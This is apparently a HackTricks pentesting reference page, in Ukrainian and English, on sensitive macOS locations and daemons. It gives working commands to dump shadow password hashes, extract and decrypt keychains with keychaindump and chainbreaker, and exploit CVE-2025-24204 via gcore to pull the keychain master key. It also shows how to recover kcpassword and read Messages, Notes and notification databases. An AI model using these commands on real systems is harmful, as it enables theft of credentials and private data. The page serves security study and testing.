# macOS Чутливі місця та цікаві демони

{{#include ../../../banners/hacktricks-training.md}}

## Паролі

### Shadow Passwords

Shadow password зберігається разом із конфігурацією користувача в plists, розташованих у **`/var/db/dslocal/nodes/Default/users/`**.\
Наступний однорядковий скрипт можна використати, щоб вивести **всю інформацію про користувачів** (включно з інформацією про хеші):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) можна використовувати для перетворення хеша у **hashcat** **format**.

Альтернативний one-liner, який виведе creds усіх не-сервісних акаунтів у **hashcat** форматі `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Інший спосіб отримати `ShadowHashData` користувача — використати `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Цей файл **використовується лише** коли система працює в **режимі одного користувача** (тобто не дуже часто).

### Keychain Dump

Зверніть увагу, що при використанні бінарника security для **вивантаження розшифрованих паролів** користувачу кілька разів буде запропоновано дозволити цю операцію.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> На основі цього коментаря [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) схоже, що ці інструменти більше не працюють у Big Sur.

### Огляд Keychaindump

A tool named **keychaindump** has been developed to extract passwords from macOS keychains, but it faces limitations on newer macOS versions like Big Sur, as indicated in a [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). The use of **keychaindump** requires the attacker to gain access and escalate privileges to **root**. The tool exploits the fact that the keychain is unlocked by default upon user login for convenience, allowing applications to access it without requiring the user's password repeatedly. However, if a user opts to lock their keychain after each use, **keychaindump** becomes ineffective.

**Keychaindump** operates by targeting a specific process called **securityd**, described by Apple as a daemon for authorization and cryptographic operations, crucial for accessing the keychain. The extraction process involves identifying a **Master Key** derived from the user's login password. This key is essential for reading the keychain file. To locate the **Master Key**, **keychaindump** scans the memory heap of **securityd** using the `vmmap` command, looking for potential keys within areas flagged as `MALLOC_TINY`. The following command is used to inspect these memory locations:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Після виявлення потенційних master keys, **keychaindump** переглядає heaps у пошуку специфічного патерну (`0x0000000000000018`), який вказує на кандидата на master key. Для використання цього ключа потрібні подальші кроки, включаючи deobfuscation, як описано у вихідному коді **keychaindump**. Аналітикам, які зосереджуються на цій ділянці, слід зауважити, що критичні дані для дешифрування keychain зберігаються в пам'яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) може використовуватися для вилучення наступних типів інформації з OSX keychain судово-прийнятним способом:

- Хешований пароль Keychain, придатний для злому з використанням [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
- Інтернет-паролі
- Загальні паролі
- Приватні ключі
- Публічні ключі
- X509 сертифікати
- Захищені нотатки
- Паролі для Appleshare

Якщо відомий пароль розблокування keychain, або майстер-ключ, отриманий за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), або файл розблокування, такий як SystemKey, Chainbreaker також може надати паролі у відкритому вигляді.

Без одного з цих методів розблокування Keychain, Chainbreaker відобразить усю іншу доступну інформацію.

#### **Вивантаження ключів Keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Вивантажити ключі keychain (з паролями) за допомогою SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягти ключі keychain (з паролями) за допомогою memory dump**

[Follow these steps](../index.html#dumping-memory-with-osxpmem) щоб виконати **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (з паролями) використовуючи пароль користувача**

Якщо ви знаєте пароль користувача, ви можете використати його, щоб **dump and decrypt keychains, які належать цьому користувачу**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) постачав `/usr/bin/gcore` з правом **`com.apple.system-task-ports.read`**, тож будь-який локальний адміністратор (або підписаний зловмисний додаток) міг дампити **пам'ять будь-якого процесу навіть коли SIP/TCC увімкнено**. Дамп `securityd` викриває **майстер-ключ Keychain** у відкритому вигляді й дозволяє розшифрувати `login.keychain-db` без пароля користувача.

**Швидка перевірка на вразливих збірках (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Передайте витягнутий hex-ключ у Chainbreaker (`--key <hex>`), щоб розшифрувати login keychain. Apple видалила entitlement у **macOS 15.3+**, тож це працює лише на непатчених збірках Sequoia або на системах, що зберегли вразливий бінарний файл.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

Пароль зберігається у файлі **`/etc/kcpassword`** у XOR із ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде повторно використано.\
Це робить відновлення пароля досить простим, наприклад за допомогою скриптів, таких як [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Цікава інформація в базах даних

### Повідомлення
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Сповіщення

Дані сповіщень можна знайти в `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Більшість цікавої інформації міститься в **blob**. Тому вам потрібно **витягти** цей вміст і **перетворити** його в **зрозумілий** **для людини** вигляд або використати **`strings`**. Щоб отримати до нього доступ, можна виконати:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Останні проблеми з конфіденційністю (NotificationCenter DB)

- У macOS **14.7–15.1** Apple зберігав вміст банерів у SQLite `db2/db` без належного приховування. CVEs **CVE-2024-44292/44293/40838/54504** дозволяли будь-якому локальному користувачу читати текст повідомлень інших користувачів просто відкривши DB (no TCC prompt). Виправлено в **15.2** шляхом переміщення/блокування DB; на старіших системах вищевказаний шлях все ще leaks recent notifications and attachments.
- База даних була доступна для читання всіма лише на уражених збірках, тому під час аналізу на застарілих кінцевих точках скопіюйте її перед оновленням, щоб зберегти артефакти.

### Примітки

Користувацькі **нотатки** можна знайти в `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Налаштування

У macOS налаштування додатків розташовані в **`$HOME/Library/Preferences`**, а в iOS — у `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

У macOS cli-утиліта **`defaults`** може використовуватися для **зміни файлу Preferences**.

**`/usr/sbin/cfprefsd`** реєструє служби XPC `com.apple.cfprefsd.daemon` та `com.apple.cfprefsd.agent` і може бути викликаний для виконання дій, таких як зміна налаштувань.

## OpenDirectory permissions.plist

Файл `/System/Library/OpenDirectory/permissions.plist` містить дозволи, застосовані до атрибутів вузла, і захищений SIP.\
Цей файл надає дозволи конкретним користувачам за UUID (а не uid), тож вони можуть отримувати доступ до певної чутливої інформації, такої як `ShadowHashData`, `HeimdalSRPKey` та `KerberosKeys`, серед іншого:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Системні сповіщення

### Сповіщення Darwin

Головним демоном для сповіщень є **`/usr/sbin/notifyd`**. Щоб отримувати сповіщення, клієнти повинні зареєструватися через `com.apple.system.notification_center` Mach port (перевірте їх за допомогою `sudo lsmp -p <pid notifyd>`). Демон конфігурується файлом `/etc/notify.conf`.

Імена, що використовуються для сповіщень, — це унікальні зворотні DNS-нотації, і коли сповіщення надсилається одному з них, клієнт(и), які вказали, що можуть його обробити, його отримають.

Можна зробити дамп поточного стану (та побачити всі імена), відправивши сигнал SIGUSR2 процесу notifyd і прочитавши згенерований файл: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Розподілений центр сповіщень

**Distributed Notification Center**, основний бінарний файл якого — **`/usr/sbin/distnoted`**, — це ще один спосіб надсилання сповіщень. Він надає деякі XPC-служби та виконує перевірки, щоб намагатися ідентифікувати клієнтів.

### Apple Push Notifications (APN)

У цьому випадку застосунки можуть реєструватися на **теми**. Клієнт згенерує токен, зв’язавшись із серверами Apple через **`apsd`**.\
Потім провайдери також згенерують токен і зможуть підключитися до серверів Apple, щоб надсилати повідомлення клієнтам. Ці повідомлення будуть локально отримані **`apsd`**, яке переадресує сповіщення до застосунку, що очікує на них.

Налаштування знаходяться в `/Library/Preferences/com.apple.apsd.plist`.

Локальна база даних повідомлень у macOS розташована в `/Library/Application\ Support/ApplePushService/aps.db`, а в iOS — в `/var/mobile/Library/ApplePushService`. Вона має 3 таблиці: `incoming_messages`, `outgoing_messages` та `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Також можна отримати інформацію про daemon та з'єднання за допомогою:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Сповіщення користувача

Це сповіщення, які користувач має бачити на екрані:

- **`CFUserNotification`**: Цей API дозволяє показати на екрані спливаюче повідомлення.
- **The Bulletin Board**: У iOS показує банер, який зникає й зберігається в Notification Center.
- **`NSUserNotificationCenter`**: Це iOS bulletin board у MacOS. База даних зі сповіщеннями розташована в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Посилання

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
